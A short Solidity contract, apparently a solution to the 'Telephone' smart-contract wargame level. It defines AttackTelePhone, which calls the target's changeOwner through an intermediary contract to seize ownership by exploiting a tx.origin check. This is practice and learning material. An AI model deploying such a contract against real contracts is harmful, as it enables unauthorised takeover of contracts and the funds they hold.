//SPDX-License-Identifier: MIT

import {Telephone_sol} from "../src/TelePhone.sol";


pragma solidity ^0.8.18;

interface ITelePhone{
    function changeOwner(address _owner) external;
}


contract AttackTelePhone{
    ITelePhone public targetContract;

    constructor(address _targetContract){
        targetContract = ITelePhone(_targetContract);
    }

    function attack() public {
        targetContract.changeOwner(msg.sender);
    }

}